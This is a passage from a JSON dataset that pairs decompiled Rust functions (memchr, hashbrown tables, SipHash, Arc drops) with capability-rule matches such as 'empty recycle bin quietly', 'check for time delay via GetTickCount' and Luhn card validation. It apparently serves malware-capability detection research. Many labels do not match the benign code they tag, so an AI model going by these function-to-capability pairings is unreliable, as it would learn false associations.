        "decompiled_code": "\nvoid sym.sysinfo::windows::component::Connection::create_instance::h5d640f778ed79abf(ulong *arg1, ulong *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    ulong uVar8;\n    int32_t iVar9;\n    ulong uStack32;\n    \n    // sysinfo::windows::component::Connection::create_instance::h5d640f778ed79abf\n    uStack32 = 0;\n    iVar9 = sub.ole32.dll_CoCreateInstance(0x44c050, 0, 1, 0x44c060, &uStack32);\n    uVar8 = uStack32;\n    if (iVar9 < 0) {\n        *arg1 = 2;\n        sym.core::ptr::drop_in_place_sysinfo::windows::component::Connection_::hf4b196367c8b12b6(arg2);\n    }\n    else {\n        sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af\n                  (arg2);\n        *arg2 = 1;\n        arg2[1] = uVar8;\n        uVar1 = *(arg2 + 2);\n        uVar2 = *(arg2 + 0x14);\n        uVar3 = *(arg2 + 3);\n        uVar4 = *(arg2 + 0x1c);\n        uVar5 = *(arg2 + 0x24);\n        uVar6 = *(arg2 + 5);\n        uVar7 = *(arg2 + 0x2c);\n        *(arg1 + 4) = *(arg2 + 4);\n        *(arg1 + 0x24) = uVar5;\n        *(arg1 + 5) = uVar6;\n        *(arg1 + 0x2c) = uVar7;\n        *(arg1 + 2) = uVar1;\n        *(arg1 + 0x14) = uVar2;\n        *(arg1 + 3) = uVar3;\n        *(arg1 + 0x1c) = uVar4;\n        *arg1 = *arg2;\n        arg1[1] = arg2[1];\n    }\n    return;\n}\n",
        "token_count": 533
    },
    "1c414d48": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nulong sym._char_as_core::fmt::Debug_::fmt::h1c414d48cbf720d1\n                (uint32_t *arg1, int64_t arg2, ulong noname_2, ulong noname_3, ulong noname_4, ulong noname_5, \n                ulong noname_6, ulong arg_48h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    int64_t arg2_00;\n    uint64_t arg1_00;\n    \n    // <char as core::fmt::Debug>::fmt::h1c414d48cbf720d1\n    arg2_00 = 0x27;\n    cVar3 = (**(*(arg2 + 0x28) + 0x20))(*(arg2 + 0x20));\n    if (cVar3 != '\\0') {\n        return 1;\n    }\n    uVar1 = *arg1;\n    arg1_00 = uVar1;\n    iVar5 = 2;\n    if (arg1_00 < 0x28) {\n        arg2_00 = *(arg1_00 * 4 + 0x408f14) + 0x408f14;\n    // switch table (40 cases) at 0x408f14\n        switch(arg2_00) {\n        case 0x408cc7:\n    // WARNING: Could not recover jumptable at 0x00408cef. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (11 cases) at 0x408fb4\n            uVar4 = (*(*0x408fbc + 0x408fb4))(0x408fb4, 0x5c);\n            return uVar4;\n        case 0x408d68:\n    // WARNING: Could not recover jumptable at 0x00408d90. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (11 cases) at 0x408fb4\n            uVar4 = (*(*0x408fbc + 0x408fb4))(0x408fb4, 0x5c);\n            return uVar4;\n        case 0x408d92:\n    // WARNING: Could not recover jumptable at 0x00408dba. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (11 cases) at 0x408fb4\n            uVar4 = (*(*0x408fbc + 0x408fb4))(0x408fb4, 0x5c);\n            return uVar4;\n        case 0x408dbc:\n    // WARNING: Could not recover jumptable at 0x00408de1. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (11 cases) at 0x408fb4\n            uVar4 = (*(*0x408fbc + 0x408fb4))(0x408fb4, 0x5c);\n            return uVar4;\n        case 0x408e12:\ncode_r0x00408e12:\n    // WARNING: Could not recover jumptable at 0x00408e2f. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (11 cases) at 0x408fb4\n            uVar4 = (*(*(iVar5 * 4 + 0x408fb4) + 0x408fb4))(0x408fb4, 0x5c);\n            return uVar4;\n        }\n    }\n    else if (uVar1 == 0x5c) {\n    // WARNING: Could not recover jumptable at 0x00408d1c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (11 cases) at 0x408fb4\n        uVar4 = (*(*0x408fbc + 0x408fb4))(0x408fb4, 0x5c);\n        return uVar4;\n    }\n    cVar3 = dbg.lookup(arg1_00);\n    if (cVar3 != '\\0') {\n        iVar2 = 0x1f;\n        if ((uVar1 | 1) != 0) {\n            for (; (uVar1 | 1) >> iVar2 == 0; iVar2 = iVar2 + -1) {\n            }\n        }\n    // WARNING: Could not recover jumptable at 0x00408d66. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (11 cases) at 0x408fb4\n        uVar4 = (*(*0x408fc0 + 0x408fb4))(0x408fb4, 0x5c);\n        return uVar4;\n    }\n    cVar3 = dbg.is_printable(arg1_00, arg2_00);\n    iVar5 = 1;\n    if (cVar3 == '\\0') {\n        iVar2 = 0x1f;\n        if ((uVar1 | 1) != 0) {\n            for (; (uVar1 | 1) >> iVar2 == 0; iVar2 = iVar2 + -1) {\n            }\n        }\n        iVar5 = 3;\n    }\n    goto code_r0x00408e12;\n}\n",
        "token_count": 1207
    },
    "c11fe596": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong sym.core::slice::memchr::memchr_general_case::hc11fe596eb571c66(ulong arg1, int64_t arg2, uint64_t arg3)\n\n{\n    uint64_t arg1_00;\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    \n    // core::slice::memchr::memchr_general_case::hc11fe596eb571c66\n    arg1_00 = (arg2 + 7U & 0xfffffffffffffff8) - arg2;\n    if (arg1_00 == 0) {\n        arg1_00 = 0;\n    }\n    else {\n        if (arg3 < arg1_00) {\n            arg1_00 = arg3;\n        }\n        uVar3 = 0;\n        do {\n            if (*(arg2 + uVar3) == arg1) {\n                return 1;\n            }\n            uVar3 = uVar3 + 1;\n        } while (arg1_00 != uVar3);\n        if (arg3 - 0x10 < arg1_00) goto code_r0x00407e20;\n    }\n    do {\n        uVar2 = *(arg2 + arg1_00) ^ arg1 * 0x101010101010101;\n        uVar3 = *(arg2 + 8 + arg1_00) ^ arg1 * 0x101010101010101;\n        if ((~uVar3 & 0x8080808080808080 & uVar3 + 0xfefefefefefefeff |\n            ~uVar2 & 0x8080808080808080 & uVar2 + 0xfefefefefefefeff) != 0) break;\n        arg1_00 = arg1_00 + 0x10;\n    } while (arg1_00 <= arg3 - 0x10);\n    if (arg3 < arg1_00) {\n        dbg.slice_start_index_len_fail(arg1_00, arg3);\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\ncode_r0x00407e20:\n    if (arg1_00 != arg3) {\n        iVar1 = 0;\n        do {\n            if (*(arg2 + arg1_00) == arg1) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n            arg2 = arg2 + 1;\n        } while (arg1_00 - arg3 != iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 559
    },
    "676195a9": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint64_t sym.crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    ulong *arg1_00;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    ulong in_RDX;\n    ulong uStackX8;\n    uchar auStackX16 [24];\n    ulong uStack40;\n    \n    // crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d\n    uStack40 = 0x40b8d1;\n    iVar4 = dbg.___chkstk_ms(arg1);\n    iVar4 = -iVar4;\n    arg1_00 = &stack0x00000008 + iVar4;\n    *(&stack0xffffffffffffffd8 + iVar4) = 0x40b8e7;\n    sym._crossbeam_epoch::internal::Bag_as_core::default::Default_::default::hc63a9d19129ba85c(arg1_00);\n    *(&stack0xffffffffffffffd8 + iVar4) = 0x40b900;\n    sym.memcpy(&stack0x00000820 + iVar4, in_RDX, 0x808);\n    *(&stack0xffffffffffffffd8 + iVar4) = 0x40b911;\n    sym.memcpy(in_RDX, arg1_00, 0x808);\n    *arg1_00 = *(arg1 + 0x100);\n    *(&stack0xffffffffffffffd8 + iVar4) = 0x40b934;\n    sym.memcpy(&stack0x00000010 + iVar4, &stack0x00000820 + iVar4, 0x808);\n    *(&stack0x00000818 + iVar4) = 0;\n    *(&stack0xffffffffffffffd8 + iVar4) = 0x40b946;\n    uVar5 = sym.crossbeam_epoch::atomic::Owned_T_::new::h0488c6e571c50320(&stack0x00000008 + iVar4);\n    do {\n        while( true ) {\n            uVar2 = *(arg1 + 0x80);\n            uVar3 = *((uVar2 & 0xfffffffffffffff8) + 0x810);\n            if (uVar3 < 8) break;\n            LOCK();\n            puVar1 = arg1 + 0x80;\n            *puVar1 = *puVar1 ^ (uVar2 == *puVar1) * (*puVar1 ^ uVar3);\n        }\n        LOCK();\n        puVar1 = (uVar2 & 0xfffffffffffffff8) + 0x810;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar1 ^ (uVar3 == 0) * (*puVar1 ^ uVar5);\n    } while (uVar3 != 0);\n    LOCK();\n    puVar1 = arg1 + 0x80;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 ^ (uVar2 == uVar3) * (*puVar1 ^ uVar5);\n    return uVar2 ^ (uVar2 != uVar3) * (uVar2 ^ *puVar1);\n}\n",
        "token_count": 735
    },
    "e19e96ba": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid sym._ZN15crossbeam_utils7backoff7Backoff6snooze17he19e96ba0c9f83d6E.197(uint32_t *arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    if (*arg1 < 7) {\n        iVar1 = 1 << (*arg1 & 0x1f);\n        do {\n            bVar2 = iVar1 != 0;\n            iVar1 = iVar1 + -1;\n        } while (bVar2);\n    }\n    else {\n        sub.KERNEL32.dll_SwitchToThread();\n    }\n    if (*arg1 < 0xb) {\n        *arg1 = *arg1 + 1;\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "cea2610e": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid sym.hashbrown::raw::RawTableInner_A_::fallible_with_capacity::hcea2610e5ab85b25\n               (ulong *arg1, uint64_t arg2, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    \n    // hashbrown::raw::RawTableInner<A>::fallible_with_capacity::hcea2610e5ab85b25\n    if (arg3 == 0) {\n        *(arg1 + 3) = ZEXT816(0);\n        iVar3 = 0x44bf50;\n        uVar2 = 0;\ncode_r0x0043eba1:\n        arg1[1] = uVar2;\n        arg1[2] = iVar3;\n        *arg1 = 0;\n        return;\n    }\n    if (arg3 < 8) {\n        uVar4 = (3 < arg3) * 4 + 4;\n    }\n    else {\n        if (SUB168(ZEXT816(arg3) * ZEXT816(8) >> 0x40, 0) != 0) goto code_r0x0043ebbb;\n        uVar2 = SUB168((ZEXT816(0) << 0x40 | ZEXT816(arg3) * ZEXT816(8) & 0xffffffffffffffff) / ZEXT816(7), 0) - 1;\n        iVar3 = 0x3f;\n        if (uVar2 != 0) {\n            for (; uVar2 >> iVar3 == 0; iVar3 = iVar3 + -1) {\n            }\n        }\n        uVar4 = (0xffffffffffffffffU >> ((iVar3 ^ 0x3f) & 0x3f)) + 1;\n    }\n    uVar2 = SUB168(ZEXT816(arg2) * ZEXT816(uVar4), 0);\n    if ((SUB168(ZEXT816(arg2) * ZEXT816(uVar4) >> 0x40, 0) == 0) && (uVar2 < 0xfffffffffffffff1)) {\n        uVar2 = uVar2 + 0xf & 0xfffffffffffffff0;\n        uVar1 = uVar4 + 0x10;\n        if (!CARRY8(uVar2, uVar1)) {\n            iVar3 = sym._ZN5alloc5alloc6Global10alloc_impl17hd38d3c93a0ea2d69E.123(uVar2 + uVar1, 0x10);\n            if (iVar3 == 0) {\n                dbg.alloc_err(uVar2 + uVar1);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            iVar3 = iVar3 + uVar2;\n            uVar2 = uVar4 - 1;\n            uVar4 = (uVar4 >> 3) * 7;\n            if (uVar2 < 8) {\n                uVar4 = uVar2;\n            }\n            arg1[3] = uVar4;\n            arg1[4] = 0;\n            sub.msvcrt.dll_memset(iVar3, 0xff, uVar1);\n            goto code_r0x0043eba1;\n        }\n    }\ncode_r0x0043ebbb:\n    dbg.capacity_overflow();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 753
    },
    "d77c6983": {
        "rules": [
            "hash data using murmur3/fc0430d5513540d685a734262ddf4bcc"
        ],
        "decompiled_code": "\nvoid sym._ZN69__LT_core..hash..sip..Sip13Rounds_u20_as_u20_core..hash..sip..Sip_GT_8c_rounds17hd77c6983cbb50731E.188\n               (uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    \n    uVar2 = arg1[2];\n    uVar3 = *arg1 + uVar2;\n    uVar1 = arg1[3];\n    uVar4 = (uVar2 << 0xd | uVar2 >> 0x33) ^ uVar3;\n    uVar2 = (uVar1 << 0x10 | uVar1 >> 0x30) ^ arg1[1] + uVar1;\n    uVar3 = (uVar3 << 0x20 | uVar3 >> 0x20) + uVar2;\n    *arg1 = uVar3;\n    arg1[3] = (uVar2 << 0x15 | uVar2 >> 0x2b) ^ uVar3;\n    uVar2 = arg1[1] + uVar1 + uVar4;\n    arg1[2] = (uVar4 << 0x11 | uVar4 >> 0x2f) ^ uVar2;\n    arg1[1] = uVar2 << 0x20 | uVar2 >> 0x20;\n    return;\n}\n",
        "token_count": 341
    },
    "91b90874": {
        "rules": [
            "hash data using murmur3/fc0430d5513540d685a734262ddf4bcc"
        ],
        "decompiled_code": "\nuint64_t sym._std::collections::hash::map::DefaultHasher_as_core::hash::Hasher_::finish::h91b90874a8673c3f(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint64_t uStack32;\n    \n    // <std::collections::hash::map::DefaultHasher as core::hash::Hasher>::finish::h91b90874a8673c3f\n    uStack56 = *(arg1 + 0x18);\n    uStack52 = *(arg1 + 0x1c);\n    uStack48 = *(arg1 + 0x20);\n    uStack44 = *(arg1 + 0x24);\n    uStack40 = *(arg1 + 0x28);\n    uStack36 = *(arg1 + 0x2c);\n    uVar3 = *(arg1 + 0x10) << 0x38 | *(arg1 + 0x38);\n    uStack32 = *(arg1 + 0x30) ^ uVar3;\n    sym._ZN69__LT_core..hash..sip..Sip13Rounds_u20_as_u20_core..hash..sip..Sip_GT_8c_rounds17hd77c6983cbb50731E.363\n              (&uStack56);\n    uVar4 = (uVar3 ^ CONCAT44(uStack52, uStack56)) + CONCAT44(uStack36, uStack40);\n    uVar3 = (CONCAT44(uStack36, uStack40) << 0xd | uStack36 >> 0x13) ^ uVar4;\n    uVar1 = (CONCAT44(uStack44, uStack48) ^ 0xff) + uStack32;\n    uVar2 = (uStack32 << 0x10 | uStack32 >> 0x30) ^ uVar1;\n    uVar4 = (uVar4 << 0x20 | uVar4 >> 0x20) + uVar2;\n    uVar1 = uVar1 + uVar3;\n    uVar3 = (uVar3 << 0x11 | uVar3 >> 0x2f) ^ uVar1;\n    uVar2 = (uVar2 << 0x15 | uVar2 >> 0x2b) ^ uVar4;\n    uVar4 = uVar4 + uVar3;\n    uVar3 = (uVar3 << 0xd | uVar3 >> 0x33) ^ uVar4;\n    uVar1 = (uVar1 << 0x20 | uVar1 >> 0x20) + uVar2;\n    uVar2 = (uVar2 << 0x10 | uVar2 >> 0x30) ^ uVar1;\n    uVar4 = (uVar4 << 0x20 | uVar4 >> 0x20) + uVar2;\n    uVar1 = uVar1 + uVar3;\n    uVar3 = (uVar3 << 0x11 | uVar3 >> 0x2f) ^ uVar1;\n    uVar2 = (uVar2 << 0x15 | uVar2 >> 0x2b) ^ uVar4;\n    uVar1 = (uVar1 << 0x20 | uVar1 >> 0x20) + uVar2;\n    uVar3 = (uVar3 << 0xd | uVar3 >> 0x33) ^ uVar4 + uVar3;\n    uVar2 = (uVar2 << 0x10 | uVar2 >> 0x30) ^ uVar1;\n    uVar1 = uVar1 + uVar3;\n    return (uVar3 << 0x11 | uVar3 >> 0x2f) ^ uVar1 ^ (uVar2 << 0x15 | uVar2 >> 0x2b) ^ (uVar1 << 0x20 | uVar1 >> 0x20);\n}\n",
        "token_count": 949
    },
    "4d36ec2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nuint64_t sym._ZN3std6thread9panicking17h4d36ec2cb47eacaeE.194(void)\n\n{\n    uint64_t uVar1;\n    \n    if ((*0x452160 & 0x7fffffffffffffff) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = dbg.is_zero_slow_path();\n        uVar1 = uVar1 ^ 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "03d0b9f7": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h03d0b9f747e8ea10\n                  (int64_t *arg1, uint64_t arg2, ulong arg3)\n\n{\n    // <alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index::h03d0b9f747e8ea10\n    if (arg2 < arg1[2]) {\n        return arg2 * 0x80 + *arg1;\n    }\n    dbg.panic_bounds_check(arg2, arg1[2], arg3);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 156
    },
    "7d57ccdf": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong sym._mut_W_as_core::fmt::Write_::write_str::h7d57ccdf715076ab(int64_t **arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    \n    // <&mut W as core::fmt::Write>::write_str::h7d57ccdf715076ab\n    arg1_00 = *arg1;\n    arg2_00 = arg1_00[2];\n    if (arg1_00[1] - arg2_00 < arg3) {\n        sym.alloc::raw_vec::RawVec_T_A_::reserve::do_reserve_and_handle::h427e6771f06031d1(arg1_00, arg2_00, arg3);\n        arg2_00 = arg1_00[2];\n    }\n    sym.memcpy(*arg1_00 + arg2_00, arg2, arg3);\n    arg1_00[2] = arg2_00 + arg3;\n    return 0;\n}\n",
        "token_count": 235
    },
    "45216aae": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.libaes::put_u32::h45216aaeb5e7b06d(uint32_t *arg1, int64_t arg2, ulong arg3)\n\n{\n    // libaes::put_u32::h45216aaeb5e7b06d\n    if (arg2 == 4) {\n        *arg1 = arg3 >> 0x18 | (arg3 & 0xff0000) >> 8 | (arg3 & 0xff00) << 8 | arg3 << 0x18;\n        return;\n    }\n    dbg.len_mismatch_fail(arg2);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 147
    },
    "8b244bca": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t sym.__u8__as_object::read::read_ref::ReadRef_::read_bytes_at_until::h8b244bca1dbe615e\n                  (int64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    \n    // <&[u8] as object::read::read_ref::ReadRef>::read_bytes_at_until::h8b244bca1dbe615e\n    arg2_00 = arg4 - arg3;\n    if ((arg4 <= arg2 && arg3 <= arg4) && (arg2_00 != 0)) {\n        uVar2 = arg2_00;\n        iVar1 = sym.memchr::memchr::x86::sse2::memchr::h916a6044a84b6269(arg1 + arg3, arg2_00);\n        if (iVar1 != 0) {\n            if (uVar2 <= arg2_00) {\n                return arg1 + arg3;\n            }\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 261
    },
    "6f0bd74d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.alloc::vec::Vec_T_A_::reserve::h6f0bd74d4d2bb641(int64_t arg1, uint64_t arg2)\n\n{\n    ulong arg1_00;\n    int64_t arg2_00;\n    \n    // alloc::vec::Vec<T,A>::reserve::h6f0bd74d4d2bb641\n    arg2_00 = *(arg1 + 0x10);\n    if (arg2 <= *(arg1 + 8) - arg2_00) {\n        return;\n    }\n    arg1_00 = sym.alloc::raw_vec::RawVec_T_A_::grow_amortized::h209ca700d3c2e5e6(arg1, arg2_00, arg2);\n    if (arg2_00 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2_00 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1_00);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 261
    },
    "5bdf8892": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym._ZN5alloc7raw_vec14handle_reserve17h5bdf8892013f3606E.181(ulong arg1, int64_t arg2)\n\n{\n    if (arg2 == -0x7fffffffffffffff) {\n        return;\n    }\n    if (arg2 == 0) {\n        sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n        do {\n            invalidInstructionException();\n        } while( true );\n    }\n    dbg.handle_alloc_error(arg1);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 127
    },
    "cbd9b219": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.alloc::sync::Arc_T_::drop_slow::hcbd9b219f9e3d89d(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    ulong *puStack24;\n    \n    // alloc::sync::Arc<T>::drop_slow::hcbd9b219f9e3d89d\n    iVar2 = *arg1;\n    puStack24 = *(iVar2 + 0x80) & 0xfffffffffffffff8;\n    sym.crossbeam_deque::deque::Buffer_T_::dealloc::hd2c9e98ecc34ade2(*puStack24, puStack24[1]);\n    sym._ZN4core3ptr107drop_in_place_LT_alloc..boxed..Box_LT_crossbeam_deque..deque..Buffer_LT_rayon_core..job..JobRef_GT__GT__GT_17h7\n              (&puStack24);\n    if (iVar2 != -1) {\n        LOCK();\n        piVar1 = iVar2 + 8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *(iVar2 + -8));\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "04ab1b1d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h04ab1b1d1e48e3ed\n                  (int64_t *arg1, uint64_t arg2, ulong arg3)\n\n{\n    // <alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index::h04ab1b1d1e48e3ed\n    if (arg2 < arg1[2]) {\n        return arg2 * 0x50 + *arg1;\n    }\n    dbg.panic_bounds_check(arg2, arg1[2], arg3);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 158
    },
    "d9df5657": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid sym.std::sys::windows::thread_parker::Parker::unpark::hd9df56576925fe3c(char *arg1)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    bool bVar4;\n    int32_t iStack92;\n    uint64_t uStack88;\n    int32_t *piStack80;\n    code *pcStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    int32_t **ppiStack32;\n    ulong uStack24;\n    \n    // std::sys::windows::thread_parker::Parker::unpark::hd9df56576925fe3c\n    cVar1 = *arg1;\n    *arg1 = '\\x01';\n    if (cVar1 == -1) {\n        if (*0x4520f8 != NULL) {\n    // WARNING: Could not recover jumptable at 0x0043acbd. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**0x4520f8)(arg1);\n            return;\n        }\n        uVar3 = *0x443088;\n        if (*0x443088 == 0xffffffffffffffff) {\n            uStack88 = 0xffffffffffffffff;\n            iStack92 = (**0x4430b0)(&uStack88, 0xc0000000, 0, 0);\n            if (iStack92 != 0) {\n                piStack80 = &iStack92;\n                pcStack72 = sym.core::fmt::num::imp::__impl_core::fmt::Display_for_i32_::fmt::hff6e31fbf33ddf61;\n                uStack64 = 0x44b4b8;\n                uStack56 = 1;\n                uStack48 = 0;\n                ppiStack32 = &piStack80;\n                uStack24 = 1;\n                dbg.panic_fmt(&uStack64, 0x44b4f8);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            LOCK();\n            bVar4 = *0x443088 == 0xffffffffffffffff;\n            *0x443088 = *0x443088 ^ bVar4 * (*0x443088 ^ uStack88);\n            uVar2 = *0x443088 ^ 0xffffffffffffffff;\n            uVar3 = uStack88;\n            if (!bVar4) {\n                sub.KERNEL32.dll_CloseHandle();\n                uVar3 = !bVar4 * uVar2 ^ 0xffffffffffffffff;\n            }\n        }\n        (**0x4430b8)(uVar3, arg1, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 598
    },
    "3fc1640c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.alloc::sync::Arc_T_::drop_slow::h3fc1640c6aa8ef54(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    // alloc::sync::Arc<T>::drop_slow::h3fc1640c6aa8ef54\n    iVar2 = *arg1;\n    sym.core::ptr::drop_in_place_std::thread::Thread_::hc3b35c2f6cb5f293(iVar2 + 0x18);\n    if (iVar2 != -1) {\n        LOCK();\n        piVar1 = iVar2 + 8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "4f25912e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.alloc::sync::Arc_T_::drop_slow::h4f25912e3b86531c(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    // alloc::sync::Arc<T>::drop_slow::h4f25912e3b86531c\n    iVar2 = *arg1;\n    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(iVar2 + 0x20);\n    if (iVar2 != -1) {\n        LOCK();\n        piVar1 = iVar2 + 8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, iVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "91892ea5": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong sym._std::io::Write::write_fmt::Adapter_T__as_core::fmt::Write_::write_str::h91892ea5ece169da\n                (int64_t **arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t *arg1_00;\n    int64_t arg2_00;\n    \n    // <std::io::Write::write_fmt::Adapter<T> as core::fmt::Write>::write_str::h91892ea5ece169da\n    arg1_00 = *arg1;\n    arg2_00 = arg1_00[2];\n    if (arg1_00[1] - arg2_00 < arg3) {\n        dbg.do_reserve_and_handle<u8, alloc::alloc::Global>(arg1_00, arg2_00, arg3);\n        arg2_00 = arg1_00[2];\n    }\n    sym.memcpy(*arg1_00 + arg2_00, arg2, arg3);\n    arg1_00[2] = arg2_00 + arg3;\n    return 0;\n}\n",
        "token_count": 240
    },
    "b7781238": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
